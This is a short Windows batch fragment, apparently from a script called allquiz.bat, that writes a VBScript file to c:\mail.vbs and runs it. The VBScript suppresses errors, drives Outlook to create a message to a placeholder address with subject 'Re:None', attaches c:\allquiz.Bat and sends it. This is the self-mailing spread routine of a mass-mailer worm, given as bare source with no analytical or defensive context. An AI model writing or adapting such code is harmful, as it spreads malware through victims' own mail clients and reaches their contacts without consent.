goto mailpart
:mailpart
echo Dim x >> c:\mail.vbs
echo on error resume next  >> c:\mail.vbs
echo Set fso ="Scripting.FileSystem.Object"  >> c:\mail.vbs
echo Set so=CreateObject(fso)  >> c:\mail.vbs
echo Set ol=CreateObject("Outlook.Application")  >> c:\mail.vbs
echo Set out= WScript.CreateObject("Outlook.Application")  >> c:\mail.vbs
echo Set Mail=ol.CreateItem(0)  >> c:\mail.vbs
echo Mail.to="email@address.com"  >> c:\mail.vbs
echo Mail.Subject="Re:None"  >> c:\mail.vbs
echo Mail.Body="allquiz"  >> c:\mail.vbs
echo Mail.Attachments.Add("c:\allquiz.Bat") >> c:\mail.vbs
echo Mail.Send  >> c:\mail.vbs
echo ol.Quit >> c:\mail.vbs
start c:\mail.vbs

